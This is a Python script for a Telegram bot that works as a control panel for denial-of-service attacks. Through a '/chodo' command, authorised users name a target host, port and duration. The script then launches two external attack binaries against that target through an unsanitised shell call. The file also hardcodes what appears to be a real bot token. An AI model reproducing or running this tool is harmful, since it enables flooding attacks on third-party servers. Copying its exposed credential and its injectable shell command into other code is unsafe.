import telebot
import subprocess
import os
from keep_alive import keep_alive

keep_alive()

# Replace with your bot token
bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw')

# Admin user IDs
admin_ids = {"7083378335", "123456789"}  # Example IDs

# Track ongoing attack state
attack_running = False

# Allowed users file
USER_FILE = "users.txt"

# Read allowed user IDs from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_users = read_users()

# Handle `/chodo` command
@bot.message_handler(commands=['chodo'])
def handle_chodo(message):
    global attack_running

    user_id = str(message.chat.id)

    if user_id in allowed_users:
        if attack_running:
            bot.reply_to(
                message, 
                "An attack is already running. Wait for it to finish before starting another."
            )
            return

        command_args = message.text.split()

        if len(command_args) == 4:
            target = command_args[1]
            port = command_args[2]
            duration = command_args[3]

            if int(duration) > 300:
                bot.reply_to(message, "Error: Duration cannot exceed 300 seconds.")
                return

            try:
                attack_running = True

                # Run both commands
                cmd1 = f"./2111 {target} {port} {duration} 800"
                cmd2 = f"./ranbal {target} {port} {duration} 800"

                bot.reply_to(message, f"Starting attack on {target}:{port} for {duration} seconds.")

                process1 = subprocess.Popen(cmd1, shell=True)
                process2 = subprocess.Popen(cmd2, shell=True)

                # Wait for both to complete
                process1.wait()
                process2.wait()

                bot.reply_to(message, "Attack completed successfully.")
            except Exception as e:
                bot.reply_to(message, f"Error: {e}")
            finally:
                attack_running = False
        else:
            bot.reply_to(message, "Usage: /chodo <target> <port> <duration>")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Handle `/myinfo` command
@bot.message_handler(commands=['myinfo'])
def handle_myinfo(message):
    user_id = str(message.chat.id)
    user = bot.get_chat(user_id)
    username = user.username if user.username else "N/A"
    is_admin = "Yes" if user_id in admin_ids else "No"

    response = f"User Info:\n\nID: {user_id}\nUsername: {username}\nAdmin: {is_admin}"
    bot.reply_to(message, response)

# Handle `/help` command
@bot.message_handler(commands=['help'])
def handle_help(message):
    help_message = '''
Available Commands:
/chodo <target> <port> <duration> - Start attack.
/myinfo - Show your information.
/help - Display this help message.
'''
    bot.reply_to(message, help_message)

# Default handler for unknown commands
@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.reply_to(message, "Unknown command. Type /help for available commands.")

# Run the bot
if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
